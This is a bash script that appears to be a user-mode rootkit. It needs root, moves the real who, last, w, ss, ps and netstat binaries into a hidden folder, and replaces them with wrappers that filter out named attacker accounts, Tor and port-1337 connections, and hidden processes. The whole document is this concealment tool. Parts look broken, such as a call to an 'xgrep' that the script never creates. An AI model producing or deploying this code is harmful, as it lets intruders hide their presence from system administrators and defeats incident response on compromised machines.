#!/bin/bash
# Don't actually use this yet - its mostly here for historical keks. It needs a tune up.
if [[ $(whoami) != "root" ]] ; then
  echo Need root to shellkit this system!
  exit 1
fi

#binsfx=".rhel"
hidepfx="_-_"
bucket=/usr/bin/alternatives
# We need to hide the extra bash shells from ps output, so lets create the trash shell
cp $(which bash) /usr/bin/trash
# Copy these bins somewhere else and make them look innocent
mkdir $bucket

cp $(which grep) $bucket/$hidepfx.grep
cp $(which netstat) $bucket/$hidepfx.netstat
cp $(which ps) $bucket/$hidepfx.ps
cp $(which ss) $bucket/$hidepfx.s
cp $(which w) $bucket/$hidepfx.w
cp $(which last) $bucket/$hidepfx.last
cp $(which who) $bucket/$hidepfx.who

# Become invisible
cat << _EOF_ > $(which who)
#!/usr/bin/trash
args="\$@"
($bucket/$hidepfx.who $args |grep -v "shellz\|lol\|$hidepfx") \
2>/dev/null >/tmp/.whostat ; cat /tmp/.whostat && rm /tmp/.whostat
exit
_EOF_

# Hide your team from lastlog
cat << _EOF_ > $(which last)
#!/usr/bin/trash
args="\$@"
($bucket/$hidepfx.last $args | grep -v "kod\|deth\|anon\|shellz\|lol\|$hidepfx") >/tmp/.lstat ; cat /tmp/.lstat && rm \
/tmp/.lstat
exit
_EOF_

# Hide your team from the wtemp
cat << _EOF_ > $(which w)
#!/usr/bin/trash
($bucket/$hidepfx.w | grep -v "kod\|deth\|anon\|shellz\|lol\|$hidepfx") >/tmp/.wstat ; cat /tmp/.wstat && rm /tmp/.wstat
_EOF_

# Network connections to hide
cat << _EOF_ > $(which ss)
#!/usr/bin/trash
tmpf=.ssstat
args="\$@"
($bucket/$hidepfx.ss $args | grep -v 
"vbox\|VBox\|:1023\|401\|localhost:22\|localhost:9050\|127.0.0.1:9050\|:1337\|127.0.0.1:22\|tor\|toranon\|kod\|deth\|anon\|shellz\|lol|$hidepfx") >/tmp/.$tmpf
cat /tmp/.$tmpf && rm /tmp/.$tmpf
_EOF_

# Processes you want to hide. Anything with hide prefix will also be 
#hidden
cat << _EOF_ > $(which ps)
#!/usr/bin/trash
args="\$@"
($bucket/$hidepfx.ps $args | xgrep -v "vbox\|VBox\|inetd\|toranon\|trash\|tor\|lol\|kod\|deth\|anon\|shellz\|false\|ps.rhel\|xgrep\|$hidepfx")>/tmp/.pstat;cat /tmp/.pstat && rm /tmp/.pstat
_EOF_

# Network connections you want to hide, like ss
cat << _EOF_ > $(which netstat)
#!/usr/bin/trash
args="\$@"
($bucket/$hidepfx.netstat $args | grep -v 
"vbox\|VBox\|:1023\|998\|localhost:22\|localhost:9050\|127.0.0.1:9050\|:1337\|127.0.0.1:22\|tor\|toranon\|kod\|deth\|anon\|shellz\|lol\|$hidepfx") \
2>/dev/null >/tmp/.nstat
cat /tmp/.nstat && rm /tmp/.nstat
_EOF_
